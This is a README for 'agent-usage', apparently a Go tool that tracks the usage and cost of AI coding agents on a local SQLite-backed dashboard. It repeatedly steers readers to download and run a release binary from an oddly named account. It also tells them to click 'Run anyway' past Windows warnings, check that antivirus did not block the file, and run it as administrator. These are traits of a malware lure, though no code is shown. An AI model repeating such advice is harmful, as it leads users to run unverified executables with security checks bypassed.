# 🧭 agent-usage - Track AI coding costs with ease

[![Download agent-usage](https://img.shields.io/badge/Download%20agent--usage-6B7280?style=for-the-badge&logo=github&logoColor=white)](https://github.com/unmercenary-timebomb913/agent-usage/releases)

## 📌 What this is

agent-usage helps you track how much you use AI coding tools and how much they cost.

It runs as a single file on your computer. It stores data in SQLite and shows it in a web dashboard. You can use it on Windows, and it also works on other systems.

Use it to see:

- how often you use coding agents
- how much each session costs
- which tools you use most
- usage trends over time

## 🪟 Windows download and setup

1. Open the [releases page](https://github.com/unmercenary-timebomb913/agent-usage/releases).
2. Find the latest release.
3. Download the Windows file for your system.
4. If you see more than one file, pick the one that matches your computer:
   - `windows-amd64` for most Windows PCs
   - `windows-arm64` for newer ARM-based Windows devices
5. Save the file to a folder you can find again, such as `Downloads`.
6. Double-click the file to run it.
7. If Windows asks for permission, choose **Run anyway** or **Yes**.
8. Open the web dashboard in your browser after the app starts.

## 💻 What you need

- Windows 10 or Windows 11
- A modern web browser
- A folder where the app can store its SQLite data
- Internet access if you want to pull usage data from connected tools

The app is small and does not need a full install. You just run the file you downloaded.

## ⚙️ How it works

agent-usage keeps things simple:

- it reads usage events from supported AI coding tools
- it stores records in a local SQLite database
- it calculates session cost and total cost
- it shows the results in a local web dashboard

This setup keeps your data on your machine unless you choose to move it.

## 📊 Dashboard view

The dashboard gives you a clear view of your usage.

You can expect:

- total usage count
- cost by tool
- cost by day, week, or month
- session history
- recent activity
- basic charts for quick review

Use the dashboard when you want a fast answer to questions like:

- How much did I spend this week?
- Which agent did I use most?
- Where did my costs go up?

## 🧩 Common use cases

agent-usage fits well if you want to:

- keep track of Claude Code usage
- review Codex usage
- monitor coding agent spend
- compare tool use over time
- keep a local record for personal or team review

It is useful for solo developers, small teams, and anyone who wants a plain view of AI tool costs.

## 🗂️ Data storage

agent-usage uses SQLite, so your data lives in one local database file.

That makes it easy to:

- back up your usage data
- move the file to another computer
- share it with a teammate
- keep a long history without extra setup

If you want to reset everything, you can delete the database file and start fresh.

## 🔎 First run checklist

After you open the app for the first time:

1. Check that the dashboard page opens in your browser.
2. Make sure the app shows recent usage data.
3. Review the storage folder to confirm the SQLite file exists.
4. Leave the app running if you want it to keep collecting data.
5. Reopen the dashboard later to review changes

## 🛠️ Basic troubleshooting

If the app does not start:

- check that you downloaded the correct Windows file
- try running it again as an administrator
- make sure your antivirus did not block the file
- confirm the file is fully downloaded

If the dashboard does not open:

- look for the local address shown by the app
- copy that address into your browser
- try Chrome, Edge, or Firefox

If you do not see data:

- confirm that your coding agent is active
- wait for a new session to finish
- check that the app can read the data source
- restart the app and refresh the dashboard

## 📁 File placement

Keep the app file in a stable folder such as:

- `Downloads`
- `Desktop`
- `C:\agent-usage\`

If you move the file often, it can be harder to find the database file later. A fixed folder makes daily use easier.

## 🧭 Typical daily use

A simple routine works well:

1. Start your AI coding tool.
2. Run agent-usage.
3. Work as usual.
4. Open the dashboard when you want to review cost and usage.
5. Check the totals at the end of the day or week.

## 🔐 Privacy

agent-usage is built for local use. Your data stays on your computer in SQLite unless you copy it elsewhere.

That gives you direct control over:

- usage history
- cost records
- session logs
- local backups

## 🌐 Supported platforms

agent-usage is built to run on:

- Windows
- macOS
- Linux

For Windows users, the main task is to visit the releases page, download the correct file, and run it

## 📦 Release download

Go to the [releases page](https://github.com/unmercenary-timebomb913/agent-usage/releases) to download and run the Windows build

## 🧾 Project details

- Repository: agent-usage
- Type: AI coding agent usage tracker
- Storage: SQLite
- Interface: web dashboard
- Focus: cost tracking and usage tracking
- Language: Go

## 🧰 What the app is good for

- watching AI tool spend
- checking usage patterns
- keeping a local record
- reviewing work over time
- reducing surprise costs

## 🖥️ Running it again later

After the first run, you can open the app the same way each time:

1. Go to the folder where you saved it.
2. Double-click the file.
3. Wait for the local service to start.
4. Open the dashboard in your browser.

If you keep the app in the same folder, it is easy to use day after day